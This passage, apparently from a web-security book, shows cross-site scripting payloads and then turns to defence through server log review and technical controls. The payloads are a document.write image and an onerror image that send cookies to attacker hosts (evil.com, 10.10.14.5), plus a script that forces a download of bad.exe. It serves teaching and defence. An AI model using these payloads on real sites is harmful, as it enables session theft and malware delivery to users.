- pgno: 110
  md: 'To steal cookies, we can attempt to load a resource from one of our controlled
    servers and keep track of the GET requests. This particular payload writes to
    the document a new HTML image which attempts to load an image but adds the **document.cookie**
    to the page.


    ```

    ```javascript

    document.write(''<img

    src="https://yourserver.evil.com/collect.gif?cookie='' + document.cookie +

    ''" />'')

    ```

    ```


    Other ways to achieve cookie stealing payloads are to attempt to load an image
    which will never load, then place our payload within the **onerror** which will
    execute.


    ```

    ```html

    <img src=x onerror=this.src="http://10.10.14.5/?c="+document.cookie>

    ```

    ```


    We can also have files downloaded automatically to the system. This can be effective
    since from the user’s perspective, the file was from the trusted website. When
    inspecting packets, it is clear that the file was downloaded from a separate server,
    however, we attempt to leverage the trust of the exploited website.


    ```

    ```javascript

    var link = document.createElement(''a'');

    link.href = ''http://evil.com/downloads/bad.exe'';

    link.download = '''';

    document.body.appendChild(link);

    link.click();

    ```

    ```


    # DEFENSIVE APPLICATION


    To better defend web applications, we should have a deep and clear understanding
    of their vulnerabilities and how they can be attacked. It is a fact that any system
    connected to the Internet will be attacked, it is up to us to ensure that these
    systems are protected enough to conduct operations. Beyond this, we must also
    understand how an attacker would think and determine to move throughout an environment.
    To protect our organization, we should always ensure that logging is enabled and
    reviewed at a regular interval.


    # LOG REVIEW


    Reviewing logs should be completed at a regular interval to ensure that the website
    is not only operating effectively but that exploits launched against the system
    can be evaluated.


    To identify logs on a Linux machine, we need to understand which web server program
    it is using. In the case of Apache, the logs for the system can be found at **/var/log/apache2/**
    which contains the access and error logs of interest. As exploits and unwanted
    items are launched against our server, we can correlate activity between these
    logs to help determine if they may have been successful.


    For Nginx-based logs, they can be found at **/var/log/nginx**. Similar to Apache,
    Nginx uses a similar access and error logs to help correlate activity. Digital
    Ocean has some excellent material on identifying and reviewing logs for Nginx
    available at [https://www.digitalocean.com/community/tutorials/nginx-access-logs-error-logs](https://www.digitalocean.com/community/tutorials/nginx-access-logs-error-logs).


    The data gathered by logs is only as good as they are reviewed -- identifying
    attacks through proactive alerts creates a significant difference in reducing
    damage. Ensure that not only are the logs being gathered, but that they are regularly
    reviewed for attacks.


    # TECHNICAL CONTROLS


    There are many controls available as open-source additions to increase the security
    of websites near-instantly. These are community-built programs which are designed
    to integrate directly with'
  merge: -1
